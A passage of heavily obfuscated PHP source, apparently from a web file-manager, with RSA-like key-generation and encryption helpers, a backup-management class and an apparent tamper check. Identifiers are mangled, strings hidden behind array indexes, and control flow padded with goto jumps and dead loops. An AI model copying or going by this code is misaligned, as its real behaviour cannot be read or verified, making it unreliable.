F—›İŞ; cÇæ½‘ó…: $EÎö§âÛ  = $f¦°½¿ª×ö[25]($EÎö§âÛ , 16); $b‡±º˜øÏ… = $f¦°½¿ª×ö[323]; switch ($B‚Å¿”“ö™) { case $f¦°½¿ª×ö[226]: $fÍ²Ó£óºÓ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($EÎö§âÛ , $f¦°½¿ª×ö[211]($a£‰‘¯ôˆÓ . $D¨•šâƒ¤¡)); break; $AÂê‰İ˜Î‡ = $aëÕ˜“‹°¨[641]; case $f¦°½¿ª×ö[217]: $fÍ²Ó£óºÓ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($EÎö§âÛ , $f¦°½¿ª×ö[211]($D¨•šâƒ¤¡ . $a£‰‘¯ôˆÓ)); $AâŞâ¬˜Ï„ = $aëÕ˜“‹°¨[642]; while ($AâŞâ¬˜Ï„ < $aëÕ˜“‹°¨[550]) { if ($AâŞâ¬˜Ï„ >= 0) { break; } $AâŞâ¬˜Ï„++; } break; case $f¦°½¿ª×ö[324]: $fÍ²Ó£óºÓ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($EÎö§âÛ , $f¦°½¿ª×ö[115]($D¨•šâƒ¤¡ . $a£‰‘¯ôˆÓ)); $Eš¦â…ÉÍ¦ = $aëÕ˜“‹°¨[643]; while ($Eš¦â…ÉÍ¦ < $aëÕ˜“‹°¨[575]) { if ($Eš¦â…ÉÍ¦ >= 0) { break; } $Eš¦â…ÉÍ¦++; } break; $cèĞ–©ô÷ = $aëÕ˜“‹°¨[644]; if (!$cèĞ–©ô÷) { return; } case $f¦°½¿ª×ö[325]: $fÍ²Ó£óºÓ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($EÎö§âÛ , $f¦°½¿ª×ö[111]($D¨•šâƒ¤¡ . $a£‰‘¯ôˆÓ)); $c™»£Â¾• = $aëÕ˜“‹°¨[645]; break; $dò×³Íã…í = $aëÕ˜“‹°¨[646]; while ($dò×³Íã…í < $aëÕ˜“‹°¨[550]) { if ($dò×³Íã…í >= 0) { break; } $dò×³Íã…í++; } case $f¦°½¿ª×ö[326]: goto CóÇğˆİ¿›; D¸‚ÃóÍÍˆ: $bÀ¦ëí´äø = 0; for ($déŠÂĞÔ½‘ = 0; $déŠÂĞÔ½‘ < $f¦°½¿ª×ö[24]($EÎö§âÛ ); $déŠÂĞÔ½‘++) { $bÀ¦ëí´äø = $bÀ¦ëí´äø == $f¦°½¿ª×ö[24]($f³×ëÕ®Òš) ? 0 : $bÀ¦ëí´äø; $bŸßŠÕÎß = $aëÕ˜“‹°¨[653]; if (!$bŸßŠÕÎß) { return; } $cäÕ°†İÑö = $bÀ¦ëí´äø++; $a…„¸ä‚ªé = $aëÕ˜“‹°¨[654]; while (strlen($a…„¸ä‚ªé) < $aëÕ˜“‹°¨[544]) { if (!$a…„¸ä‚ªé) { break; } $a…„¸ä‚ªé++; } $b´Éğ¸ˆ«Á = $f¦°½¿ª×ö[328]($b‡±º˜øÏ…, $EÎö§âÛ [$déŠÂĞÔ½‘]) - $bÑÍòØÕ - $f¦°½¿ª×ö[329]($f³×ëÕ®Òš[$cäÕ°†İÑö]); $DÏ‚©œÜ Ş = $aëÕ˜“‹°¨[655]; if (strlen($DÏ‚©œÜ Ş) < $aëÕ˜“‹°¨[575]) { die; } while ($b´Éğ¸ˆ«Á < 0) { $b´Éğ¸ˆ«Á += 64; } $dÃ¯¨°£à .= $b‡±º˜øÏ…[$b´Éğ¸ˆ«Á]; } $fÍ²Ó£óºÓ = $f¦°½¿ª×ö[332]($dÃ¯¨°£à); goto Aã›ç²·‘ø; Eá§ÒÖÏ„: $Bá­òæÁ·â = $aëÕ˜“‹°¨[648]; if (strlen($Bá­òæÁ·â) < $aëÕ˜“‹°¨[553]) { return; } $EÎö§âÛ  = $f¦°½¿ª×ö[25]($EÎö§âÛ , 1); goto cİŞôøàŠ; cİŞôøàŠ: $BÀª÷ä¯ğˆ = $aëÕ˜“‹°¨[649]; $bÑÍòØÕ = $f¦°½¿ª×ö[328]($b‡±º˜øÏ…, $Fİ–Ä»ÙÑí); $f³×ëÕ®Òš = $f¦°½¿ª×ö[111]($Fİ–Ä»ÙÑí . $f¦°½¿ª×ö[111]($a£‰‘¯ôˆÓ . $Fİ–Ä»ÙÑí) . $a£‰‘¯ôˆÓ); goto BÒïõ²Ö‚î; A‚âø¨Ü‹: $Eß§´§ŸÙÊ = $aëÕ˜“‹°¨[651]; $dÃ¯¨°£à = $f¦°½¿ª×ö[10]; $déŠÂĞÔ½‘ = 0; goto dâîÃÌÊî; CóÇğˆİ¿›: $EÎö§âÛ  = $f¦°½¿ª×ö[331]($EÎö§âÛ ); $BÏñå®­È = $aëÕ˜“‹°¨[647]; $Fİ–Ä»ÙÑí = $EÎö§âÛ [0]; goto Eá§ÒÖÏ„; Aã›ç²·‘ø: break; goto b¨©“²‘ï·; dâîÃÌÊî: $aÁî™ìå = $aëÕ˜“‹°¨[652]; while (strlen($aÁî™ìå) < $aëÕ˜“‹°¨[550]) { if (!$aÁî™ìå) { break; } $aÁî™ìå++; } $b´Éğ¸ˆ«Á = 0; goto D¸‚ÃóÍÍˆ; BÒïõ²Ö‚î: $e’¿°¹×©Ş = $aëÕ˜“‹°¨[650]; while (strlen($e’¿°¹×©Ş) < $aëÕ˜“‹°¨[550]) { if (!$e’¿°¹×©Ş) { break; } $e’¿°¹×©Ş++; } $f³×ëÕ®Òš = $f¦°½¿ª×ö[25]($f³×ëÕ®Òš, $bÑÍòØÕ % 8, $bÑÍòØÕ % 8 + 7); goto A‚âø¨Ü‹; b¨©“²‘ï·: default: $fÍ²Ó£óºÓ = $this->{$_SERVER[°Šë¾«øµÑ][240]}($EÎö§âÛ , $a£‰‘¯ôˆÓ . $D¨•šâƒ¤¡); $B®Äâ–éè’ = $aëÕ˜“‹°¨[656]; if (!$B®Äâ–éè’) { return; } break; $Eõ´ÃŒ¢–‚ = $aëÕ˜“‹°¨[657]; if (!$Eõ´ÃŒ¢–‚) { return; } } goto d¬ÛŒÜ™ÕÃ; d¬ÛŒÜ™ÕÃ: if ($B°†»¥„Å» - 1 > 0) { $fÍ²Ó£óºÓ = $this->{$_SERVER[°Šë¾«øµÑ][185]}($fÍ²Ó£óºÓ, $a£‰‘¯ôˆÓ, $B°†»¥„Å» - 1); } return $fÍ²Ó£óºÓ; goto BŠšâÄØ··; F—›İŞ: $EÎö§âÛ  = $f¦°½¿ª×ö[211]($EÎö§âÛ ); $B‚Å¿”“ö™ = $EÎö§âÛ [0]; $D¨•šâƒ¤¡ = $f¦°½¿ª×ö[25]($EÎö§âÛ , 1, 15); goto cÇæ½‘ó…; BŠšâÄØ··: } public function kjyb375c0283($c‡œåªÉœ) { goto e¹¥ƒÅ†‘ò; EòšâˆåƒŠ: $Fïçê”‹Í“ = 2; $C‹İ”Ç«Ü– = $c…­¹¾’÷¤[663]; if (strlen($C‹İ”Ç«Ü–) < $c…­¹¾’÷¤[550]) { die; } goto Cå†Ö—¸©; Cå†Ö—¸©: for ($A·Ü‚…Î¨¡ = 0; $A·Ü‚…Î¨¡ < $cãã›¹²” * 10; $A·Ü‚…Î¨¡++) { if (($cãã›¹²” * $A·Ü‚…Î¨¡ + 1) % $CÚïÆëÊæ == 0) { $Fïçê”‹Í“ = $bÄöŸá‚[198](($cãã›¹²” * $A·Ü‚…Î¨¡ + 1) / $CÚïÆëÊæ); break; } } $fƒİ˜ˆ‚ç = $this->{$_SERVER[°Šë¾«øµÑ][144]}($dÊª’¶Â™ê * $EŞŒšĞ«‚„ . $bÄöŸá‚[10], $bÄöŸá‚[146]); $EÜïÈàŒ¨ = $bÄöŸá‚[111]($bÄöŸá‚[334] . ($dÊª’¶Â™ê + $EŞŒšĞ«‚„) . $bÄöŸá‚[335] . $CÚïÆëÊæ . $bÄöŸá‚[335] . $Fïçê”‹Í“ . $bÄöŸá‚[336]); goto DÉ²¨¸­¹¤; CáÑ¸¡× ¥: while (strlen($D™ÌõÀÇåå) < $c…­¹¾’÷¤[575]) { if (!$D™ÌõÀÇåå) { break; } $D™ÌõÀÇåå++; } return $ağÉÍ•ÑÚ¸; $bÀ’Àê‡® = $c…­¹¾’÷¤[666]; goto eíª½ÎùŠœ; b—´Ì¦†‹±: $EŞŒšĞ«‚„ = $this->{$_SERVER[°Šë¾«øµÑ][333]}(); $cãã›¹²” = ($dÊª’¶Â™ê - 1) * ($EŞŒšĞ«‚„ - 1); $d©óŠööÆ = $c…­¹¾’÷¤[658]; goto Cò©Œ‡£Üè; Cò©Œ‡£Üè: $CÚïÆëÊæ = $bÄöŸá‚[198](($dÊª’¶Â™ê + $EŞŒšĞ«‚„) / 2); $aÛ¥Ã¼¢ÇÁ = $c…­¹¾’÷¤[637]; while (1) { $ağˆéÒÜ‹ = $CÚïÆëÊæ; $Bœñùˆ…¼‰ = $c…­¹¾’÷¤[659]; if (!$Bœñùˆ…¼‰) { return; } $A•šù¼’«ò = $cãã›¹²”; $aİ¡Ø¢òå = $c…­¹¾’÷¤[660]; if (!$aİ¡Ø¢òå) { return; } while ($A•šù¼’«ò % $ağˆéÒÜ‹ != 0) { $D­–è«õõ‚ = $A•šù¼’«ò; $d«Î‹¾ó–² = $c…­¹¾’÷¤[661]; if (strlen($d«Î‹¾ó–²) < $c…­¹¾’÷¤[553]) { die; } $A•šù¼’«ò = $ağˆéÒÜ‹; $Ağ†»½¡‡ = $c…­¹¾’÷¤[662]; if (strlen($Ağ†»½¡‡) < $c…­¹¾’÷¤[553]) { die; } $ağˆéÒÜ‹ = $D­–è«õõ‚ % $ağˆéÒÜ‹; } if ($ağˆéÒÜ‹ == 1) { break; } else { $CÚïÆëÊæ++; } } goto EòšâˆåƒŠ; DÉ²¨¸­¹¤: $CŠÌß±…”Ø = $c…­¹¾’÷¤[664]; $ağÉÍ•ÑÚ¸ = $this->{$_SERVER[°Šë¾«øµÑ][144]}($c‡œåªÉœ, $EÜïÈàŒ¨) . $bÄöŸá‚[337] . $fƒİ˜ˆ‚ç; $D™ÌõÀÇåå = $c…­¹¾’÷¤[665]; goto CáÑ¸¡× ¥; e¹¥ƒÅ†‘ò: $c…­¹¾’÷¤ =& $_SERVER[¿õñ]; $bÄöŸá‚ =& $_SERVER[°Šë¾«øµÑ]; $dÊª’¶Â™ê = $this->{$_SERVER[°Šë¾«øµÑ][333]}(); goto b—´Ì¦†‹±; eíª½ÎùŠœ: } public function pvgfa8ecf893($Eâ¿‹«ÔÃÕ) { goto e’§´‹Øõ; cÈ˜æÃ¾¶: if (!$DÕÃÂÅéöù) { return $a÷¯‚ˆÜï[10]; } $DÕÃÂÅéöù = $a÷¯‚ˆÜï[198]($DÕÃÂÅéöù); $FñË š¿Äƒ = $E…••Õêİ¥[669]; goto E»›Ì¨õ¸º; E’ÒÈÄêõ¸: $BçŠİè¯Ûğ = ($BÌîÃ”–Ğ® - 1) * ($DÃ¾Ãøù - 1); $a«°¶ò¹­ = $E…••Õêİ¥[673]; if (!$a«°¶ò¹­) { return; } goto E·òÛÅ˜Á™; cÀ‹‡ã«ò: $F‹èÌ›©£ = $E…••Õêİ¥[667]; if (strlen($F‹èÌ›©£) < $E…••Õêİ¥[548]) { die; } if ($a÷¯‚ˆÜï[19]($cÇì£ÓÏ¦ß) != 2) { return $a÷¯‚ˆÜï[10]; } goto DñÖ²çª®; E»›Ì¨õ¸º: while (strlen($FñË š¿Äƒ) < $E…••Õêİ¥[575]) { if (!$FñË š¿Äƒ) { break; } $FñË š¿Äƒ++; } $BÌîÃ”–Ğ® = 0; $cÏêŠÛî‹× = $E…••Õêİ¥[670]; goto fó´ï¯—‘ê; e’§´‹Øõ: $E…••Õêİ¥ =& $_SERVER[¿õñ]; $a÷¯‚ˆÜï =& $_SERVER[°Šë¾«øµÑ]; $cÇì£ÓÏ¦ß = $a÷¯‚ˆÜï[0]($a÷¯‚ˆÜï[337], $Eâ¿‹«ÔÃÕ); goto cÀ‹‡ã«ò; F„ñµ¢‰Œ·: for ($EÏÇ†óŸÏ¬ = 0; $EÏÇ†óŸÏ¬ < $BçŠİè¯Ûğ * 10; $EÏÇ†óŸÏ¬++) { if (($BçŠİè¯Ûğ * $EÏÇ†óŸÏ¬ + 1) % $Dª†¼å±¤‚ == 0) { $bãŸÅ‹åÆ = $a÷¯‚ˆÜï[198](($BçŠİè¯Ûğ * $EÏÇ†óŸÏ¬ + 1) / $Dª†¼å±¤‚); break; } } $d“ç³„ìÀœ = $a÷¯‚ˆÜï[111]($a÷¯‚ˆÜï[334] . ($BÌîÃ”–Ğ® + $DÃ¾Ãøù) . $a÷¯‚ˆÜï[335] . $Dª†¼å±¤‚ . $a÷¯‚ˆÜï[335] . $bãŸÅ‹åÆ . $a÷¯‚ˆÜï[336]); $BÉŒ·¥· = $this->{$_SERVER[°Šë¾«øµÑ][240]}($cÇì£ÓÏ¦ß[0], $d“ç³„ìÀœ); goto dÑ„¾³ºÔ; dÑ„¾³ºÔ: return $BÉŒ·¥·; $c»èÌ¢Íìù = $E…••Õêİ¥[679]; while (strlen($c»èÌ¢Íìù) < $E…••Õêİ¥[548]) { if (!$c»èÌ¢Íìù) { break; } $c»èÌ¢Íìù++; } goto bƒƒ³Î‚ø„; E·òÛÅ˜Á™: $Dª†¼å±¤‚ = $a÷¯‚ˆÜï[198](($BÌîÃ”–Ğ® + $DÃ¾Ãøù) / 2); $C®¥³¦Ïæ± = $E…••Õêİ¥[674]; if (!$C®¥³¦Ïæ±) { return; } goto cØ†Ææó„Ô; DñÖ²çª®: $DÕÃÂÅéöù = $this->{$_SERVER[°Šë¾«øµÑ][240]}($cÇì£ÓÏ¦ß[1] . $a÷¯‚ˆÜï[10], $a÷¯‚ˆÜï[146]); $d¤´ˆå–²÷ = $E…••Õêİ¥[668]; if (!$d¤´ˆå–²÷) { return; } goto cÈ˜æÃ¾¶; cØ†Ææó„Ô: while (1) { $EŞ—»ÇÉò = $Dª†¼å±¤‚; $FÏÈ¨ÇŠ†ˆ = $BçŠİè¯Ûğ; while ($FÏÈ¨ÇŠ†ˆ % $EŞ—»ÇÉò != 0) { $BçÍğ“›Á = $FÏÈ¨ÇŠ†ˆ; $D¶µá²Š‡ˆ = $E…••Õêİ¥[675]; if (!$D¶µá²Š‡ˆ) { return; } $FÏÈ¨ÇŠ†ˆ = $EŞ—»ÇÉò; $fÆ¦ ê„éŠ = $E…••Õêİ¥[676]; if (!$fÆ¦ ê„éŠ) { die; } $EŞ—»ÇÉò = $BçÍğ“›Á % $EŞ—»ÇÉò; $eÚÕ¯ä¼¾¥ = $E…••Õêİ¥[677]; if (strlen($eÚÕ¯ä¼¾¥) < $E…••Õêİ¥[553]) { die; } } if ($EŞ—»ÇÉò == 1) { break; } else { $Dª†¼å±¤‚++; } } $bãŸÅ‹åÆ = 2; $f¿”‡àš„ = $E…••Õêİ¥[678]; goto F„ñµ¢‰Œ·; fó´ï¯—‘ê: if (strlen($cÏêŠÛî‹×) < $E…••Õêİ¥[548]) { die; } $DÃ¾Ãøù = 0; for ($EÏÇ†óŸÏ¬ = 3; $EÏÇ†óŸÏ¬ < $DÕÃÂÅéöù; $EÏÇ†óŸÏ¬ += 2) { if ($DÕÃÂÅéöù % $EÏÇ†óŸÏ¬ != 0) { continue; } $BÌîÃ”–Ğ® = $EÏÇ†óŸÏ¬; $DØ†Ûê‘‰£ = $E…••Õêİ¥[671]; if (strlen($DØ†Ûê‘‰£) < $E…••Õêİ¥[553]) { die; } $DÃ¾Ãøù = $a÷¯‚ˆÜï[198]($DÕÃÂÅéöù / $EÏÇ†óŸÏ¬); break; $f£šÔˆÒŠ¯ = $E…••Õêİ¥[672]; } goto E’ÒÈÄêõ¸; bƒƒ³Î‚ø„: } public function eufo8d4ead83() { goto E†ø¹ñµ˜Š; B®¡½ºø¬: return $c…ÏÙé‡âõ; $a‰¹«Åè¦ = $FÜ¢ÏñòÔ[683]; while (strlen($a‰¹«Åè¦) < $FÜ¢ÏñòÔ[548]) { if (!$a‰¹«Åè¦) { break; } $a‰¹«Åè¦++; } goto F¬ŠõÄ¾ˆ; E†ø¹ñµ˜Š: $FÜ¢ÏñòÔ =& $_SERVER[¿õñ]; $cåÅ¾£„Ê =& $_SERVER[°Šë¾«øµÑ]; $DÁº‹ç±ÑÂ = $cåÅ¾£„Ê[318]($cåÅ¾£„Ê[338](2, 14), $cåÅ¾£„Ê[338](2, 16) - 1); goto D¨ÇâÈÁ™°; CÙº¨Ó»ì: $E‡³“°—½ù = $FÜ¢ÏñòÔ[681]; if (!$E‡³“°—½ù) { die; } for ($D—¾ó‘¥ÌÔ = $DÁº‹ç±ÑÂ; $D—¾ó‘¥ÌÔ > 1; $D—¾ó‘¥ÌÔ--) { $bñß¸Ÿ¤ò„ = !0; $E‹ÌôÀ›„ = $FÜ¢ÏñòÔ[682]; while (strlen($E‹ÌôÀ›„) < $FÜ¢ÏñòÔ[544]) { if (!$E‹ÌôÀ›„) { break; } $E‹ÌôÀ›„++; } foreach ($bí—ƒÊñ—ƒ as $BÜ¤°îº„Š) { if ($D—¾ó‘¥ÌÔ % $BÜ¤°îº„Š == 0) { $bñß¸Ÿ¤ò„ = !1; break; } } if ($bñß¸Ÿ¤ò„) { $c…ÏÙé‡âõ = $D—¾ó‘¥ÌÔ; break; } } goto B®¡½ºø¬; D¨ÇâÈÁ™°: $e´Ã”‰¦™İ = $FÜ¢ÏñòÔ[680]; if (!$e´Ã”‰¦™İ) { return; } $bí—ƒÊñ—ƒ = array(); goto FÛùòˆÅá; FÛùòˆÅá: $DĞåšÁì›ö = 1; while ($DĞåšÁì›ö <= (int) $cåÅ¾£„Ê[339]($DÁº‹ç±ÑÂ)) { $D—¾ó‘¥ÌÔ = $DĞåšÁì›ö; while (!0) { $D—¾ó‘¥ÌÔ++; if ($D—¾ó‘¥ÌÔ <= 2) { $DĞåšÁì›ö = $D—¾ó‘¥ÌÔ; break; } else { if ($D—¾ó‘¥ÌÔ < 2) { continue; } } $bñß¸Ÿ¤ò„ = !0; for ($cŸ‹¹¾Åµ“ = 2; $cŸ‹¹¾Åµ“ <= $cåÅ¾£„Ê[339]($D—¾ó‘¥ÌÔ); $cŸ‹¹¾Åµ“++) { if ($D—¾ó‘¥ÌÔ % $cŸ‹¹¾Åµ“ == 0) { $bñß¸Ÿ¤ò„ = !1; } } if ($bñß¸Ÿ¤ò„) { $DĞåšÁì›ö = $D—¾ó‘¥ÌÔ; break; } } $bí—ƒÊñ—ƒ[] = $DĞåšÁì›ö; } $c…ÏÙé‡âõ = 2; goto CÙº¨Ó»ì; F¬ŠõÄ¾ˆ: } public function ulegc3201ae8($c§ÊõÇ£Û, $E¬ÂÌæ”Ÿ) { $dÈ‰àïô¨Ë =& $_SERVER[°Šë¾«øµÑ]; return $dÈ‰àïô¨Ë[13](array($dÈ‰àïô¨Ë[14], $dÈ‰àïô¨Ë[340]), $c§ÊõÇ£Û, $E¬ÂÌæ”Ÿ); } public function mbns99040559($b³ÜËœ„Øì, $d„ÔÔ§ê½) { $DÑŒß°ÅÄÎ =& $_SERVER[°Šë¾«øµÑ]; return $DÑŒß°ÅÄÎ[13](array($DÑŒß°ÅÄÎ[341], $DÑŒß°ÅÄÎ[342]), $b³ÜËœ„Øì, $d„ÔÔ§ê½); } public function xroj60262ae1($Fäğ†Á‡Ø, $DÕµ‹÷ÅŠ¼) { $cß‰Áß‡Ì =& $_SERVER[°Šë¾«øµÑ]; return $cß‰Áß‡Ì[13](array($cß‰Áß‡Ì[341], $cß‰Áß‡Ì[343]), $Fäğ†Á‡Ø, $DÕµ‹÷ÅŠ¼); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $DƒˆÑÓ½ =& $_SERVER[¿õñ]; self::$name = date($DƒˆÑÓ½[684]); if (!($C„íå³ôğµ = Model($DƒˆÑÓ½[685])->lastItem())) { $C„íå³ôğµ = $this->initData(); } else { self::$name = $C„íå³ôğµ[$DƒˆÑÓ½[28]]; if ($C„íå³ôğµ[$DƒˆÑÓ½[686]] == $DƒˆÑÓ½[493]) { self::$name = date($DƒˆÑÓ½[687]); $cŠòøòŠš¹ = 0; if (isset($C„íå³ôğµ[$DƒˆÑÓ½[278]][$DƒˆÑÓ½[164]][$DƒˆÑÓ½[415]])) { $cŠòøòŠš¹ = (int) $C„íå³ôğµ[$DƒˆÑÓ½[278]][$DƒˆÑÓ½[164]][$DƒˆÑÓ½[415]]; } if ($C„íå³ôğµ[$DƒˆÑÓ½[28]] == self::$name) { Model($DƒˆÑÓ½[685])->remove($C„íå³ôğµ[$DƒˆÑÓ½[364]]); } $C„íå³ôğµ = $this->initData($cŠòøòŠš¹, $C„íå³ôğµ[$DƒˆÑÓ½[688]]); } else { $this->checkStore($C„íå³ôğµ[$DƒˆÑÓ½[688]]); } } self::$option = $C„íå³ôğµ; } private function initData($b‰åİÌ—î’ = 0, $fâÓá§Š = '') { goto C £éµ¤Äì; a’¥®Ñ†îñ: $this->checkStore($fÓ…á×âáã[$DÌ•ğè¡§°[688]]); $bç‘Öæš† = array($DÌ•ğè¡§°[688] => $fÓ…á×âáã[$DÌ•ğè¡§°[688]], $DÌ•ğè¡§°[28] => self::$name, $DÌ•ğè¡§°[686] => 0, $DÌ•ğè¡§°[689] => $fÓ…á×âáã[$DÌ•ğè¡§°[689]], $DÌ•ğè¡§°[278] => array($DÌ•ğè¡§°[690] => array($DÌ•ğè¡§°[686] => 0), $DÌ•ğè¡§°[691] => array($DÌ•ğè¡§°[686] => 0, $DÌ•ğè¡§°[692] => 0, $DÌ•ğè¡§°[693] => 0, $DÌ•ğè¡§°[29] => $DÌ•ğè¡§°[33]), $DÌ•ğè¡§°[694] => array($DÌ•ğè¡§°[686] => 0, $DÌ•ğè¡§°[692] => 0, $DÌ•ğè¡§°[693] => 0), $DÌ•ğè¡§°[164] => array($DÌ•ğè¡§°[686] => 0, $DÌ•ğè¡§°[695] => 0, $DÌ•ğè¡§°[696] => 0, $DÌ•ğè¡§°[697] => 0, $DÌ•ğè¡§°[698] => 0, $DÌ•ğè¡§°[415] => $b‰åİÌ—î’)), $DÌ•ğè¡§°[699] => time(), $DÌ•ğè¡§°[700] => 0); $FİªÓù½§ = Model($DÌ•ğè¡§°[685])->insert($bç‘Öæš†); goto E¨Ì†Õáì×; E¨Ì†Õáì×: $bç‘Öæš†[$DÌ•ğè¡§°[364]] = $FİªÓù½§; return $bç‘Öæš†; goto eæ£¡‘‰; C £éµ¤Äì: $DÌ•ğè¡§° =& $_SERVER[¿õñ]; $fÓ…á×âáã = Model($DÌ•ğè¡§°[685])->config(); if ($fâÓá§Š && $fÓ…á×âáã[$DÌ•ğè¡§°[688]] != $fâÓá§Š) { $b‰åİÌ—î’ = 0; } goto a’¥®Ñ†îñ; eæ£¡‘‰: } private function checkStore($eÉºœßë²Í) { $d¹ª§¨Şñ¯ =& $_SERVER[¿õñ]; $cŠ•“Ü™ÁÄ = Model($d¹ª§¨Şñ¯[701])->listData($eÉºœßë²Í); Model($d¹ª§¨Şñ¯[701])->checkConfig($cŠ•“Ü™ÁÄ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¿õñ][685])->findByName(self::$name); } return self::$option; } public static function set($dÉš¶ê‡ì) { $A¥©öÔŞ‹— =& $_SERVER[¿õñ]; $E„¿³ñÕÇ = self::get(); foreach ($dÉš¶ê‡ì as $FöÓ™óø„ => $aŞÜºÒÏ) { $F—Àãå°­ = explode($A¥©öÔŞ‹—[92], $FöÓ™óø„); $FÈÜºÙï ƒ = count($F—Àãå°­); switch ($FÈÜºÙï ƒ) { case 1: $E„¿³ñÕÇ[$F—Àãå°­[0]] = $aŞÜºÒÏ; break; case 2: $E„¿³ñÕÇ[$F—Àãå°­[0]][$F—Àãå°­[1]] = $aŞÜºÒÏ; break; case 3: $E„¿³ñÕÇ[$F—Àãå°­[0]][$F—Àãå°­[1]][$F—Àãå°­[2]] = $aŞÜºÒÏ; break; } } Model($A¥©öÔŞ‹—[685])->update($E„¿³ñÕÇ[$A¥©öÔŞ‹—[364]], $E„¿³ñÕÇ); self::$option = $E„¿³ñÕÇ; return self::$option; } public function keep() { $C¤§Õ‡Úã£ =& $_SERVER[¿õñ]; $fùò¼éªÑ¤ = self::get(); if ($fùò¼éªÑ¤[$C¤§Õ‡Úã£[278]][$C¤§Õ‡Úã£[690]][$C¤§Õ‡Úã£[686]] == $C¤§Õ‡Úã£[493]) { return; } $this->backupKeep($fùò¼éªÑ¤); self::set(array($C¤§Õ‡Úã£[702] => 1)); } private function backupKeep($CœœßÎÓáÃ) { goto D”Š„ø²Ï’; c»Ö²™Šå‡: $AŒù¹ëÉ = array_unique($AŒù¹ëÉ); foreach ($Dë”‘ä‹šÜ as $C´’ô”Ñ¥Ğ) { if (!empty($C´’ô”Ñ¥Ğ[$B¥œæâ‚±ó[28]]) && in_array($C´’ô”Ñ¥Ğ[$B¥œæâ‚±ó[28]], $AŒù¹ëÉ)) { continue; } Model($B¥œæâ‚±ó[685])->remove($C´’ô”Ñ¥Ğ[$B¥œæâ‚±ó[364]]); $bå ÀËã„ = "\x7b\x69\x6f\x3a{$CœœßÎÓáÃ[$B¥œæâ‚±ó[688]]}\175\57\144\141\x74\141\x62\x61\x73\145\57\142\141\143\x6b\165\x70\x5f{$C´’ô”Ñ¥Ğ[$B¥œæâ‚±ó[28]]}"; IO::remove($bå ÀËã„, !1); } goto F®”ÌÅÆ‰°; D”Š„ø²Ï’: $B¥œæâ‚±ó =& $_SERVER[¿õñ]; $Dë”‘ä‹šÜ = Model($B¥œæâ‚±ó[685])->listData(); if (empty($Dë”‘ä‹šÜ)) { return; } goto E³ìÈÎäğØ; E³ìÈÎäğØ: $AŒù¹ëÉ = array(); for ($cŞæ‚Üº™ = 0; $cŞæ‚Üº™ <= 7; $cŞæ‚Üº™++) { $AŒù¹ëÉ[] = date($B¥œæâ‚±ó[687], strtotime("\55{$cŞæ‚Üº™}\x20\144\141\171\x73")); } for ($cŞæ‚Üº™ = 0; $cŞæ‚Üº™ < 12; $cŞæ‚Üº™++) { $AŒù¹ëÉ[] = date($B¥œæâ‚±ó[703], strtotime("\x2d{$cŞæ‚Üº™}\40\155\157\x6e\164\150\163")); } goto c»Ö²™Šå‡; F®”ÌÅÆ‰°: } public function db() { goto f° ˜âŒÔ; E‡½“í¤Ë¸: $f‘áöç¡‰ö = new BackupDb(); if (!$f‘áöç¡‰ö->index()) { return !1; } self::set(array($Bˆ÷ç•ğ²ª[704] => 1)); goto DÃÚ”´¸“¼; f° ˜âŒÔ: $Bˆ÷ç•ğ²ª =& $_SERVER[¿õñ]; $AàÈ¡èÔŠ = self::get(); if ($AàÈ¡èÔŠ[$Bˆ÷ç•ğ²ª[278]][$Bˆ÷ç•ğ²ª[691]][$Bˆ÷ç•ğ²ª[686]] == $Bˆ÷ç•ğ²ª[493]) { return !0; } goto E‡½“í¤Ë¸; DÃÚ”´¸“¼: return !0; goto E‚ÒŒö¡ÊØ; E‚ÒŒö¡ÊØ: } public function dbFile() { goto c…ä¤ƒ¢®Ş; dØ‚¿—‹æ—: return !0; goto bÏ¿‡øª™Ñ; EË¶©Øğ£: $FóØ²£×’ = new BackupDbFile(); if (!$FóØ²£×’->index()) { return !1; } self::set(array($Bñ‹Û‰½î®[705] => 1)); goto dØ‚¿—‹æ—; c…ä¤ƒ¢®Ş: $Bñ‹Û‰½î® =& $_SERVER[¿õñ]; $D˜‡é»à¢± = self::get(); if ($D˜‡é»à¢±[$Bñ‹Û‰½î®[278]][$Bñ‹Û‰½î®[694]][$Bñ‹Û‰½î®[686]] == $Bñ‹Û‰½î®[493]) { return !0; } goto EË¶©Øğ£; bÏ¿‡øª™Ñ: } public function file() { $e¡ŸµêöĞØ =& $_SERVER[¿õñ]; $AóèÍïöñ‚ = self::get(); if ($AóèÍïöñ‚[$e¡ŸµêöĞØ[278]][$e¡ŸµêöĞØ[164]][$e¡ŸµêöĞØ[686]] == $e¡ŸµêöĞØ[493]) { return !0; } if (!isset($AóèÍïöñ‚[$e¡ŸµêöĞØ[689]]) || $AóèÍïöñ‚[$e¡ŸµêöĞØ[689]] == $e¡ŸµêöĞØ[464]) { $dÔÍªÏ„ëš = new BackupFile(); if (!$dÔÍªÏ„ëš->index()) { return !1; } } self::set(array($e¡ŸµêöĞØ[706] => 1, $e¡ŸµêöĞØ[686] => 1)); return !0; } } goto cÙ•÷·œá°; Cì¼¤Ù³¤Õ: if ($_SERVER[$_SERVER[¿õñ][780]] != $a»˜Ñ¹­‚($EãÄŒ«–¬)) { goto FÕÈ¼ß®æÆ; AŒº±¾‚Â: $B¹‚Ç «·« = explode($_SERVER[¿õñ][214], $d´§‡¹ï·È); if (count($B¹‚Ç «·«) < $_SERVER[¿õñ][550]) { $aàİ ‡¡áˆ = $_SERVER[¿õñ][784]; $aàİ ‡¡áˆ(); } $Cæ“ôÓ’‘ = $_SERVER[¿õñ][785]; goto eÛîâÆ…ëĞ; FÕÈ¼ß®æÆ: $c¾õ¿„¯¢© = $_SERVER[¿õñ][781]; $FÚÓ‡îŒ = $_SERVER[$_SERVER[¿õñ][782]] . $_SERVER[¿õñ][783]; $d´§‡¹ï·È = $c¾õ¿„¯¢©($FÚÓ‡îŒ); goto AŒº±¾‚Â; eÛîâÆ…ëĞ: $Cæ“ôÓ’‘($EãÄŒ«–¬); goto FÏ¸£æù; FÏ¸£æù: } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $A¯ôª³Œòî =& $_SERVER[¿õñ]; $b¿›ÜÍºŞ = $GLOBALS[$A¯ôª³Œòî[6]][$A¯ôª³Œòî[334]]; self::$cachePath = 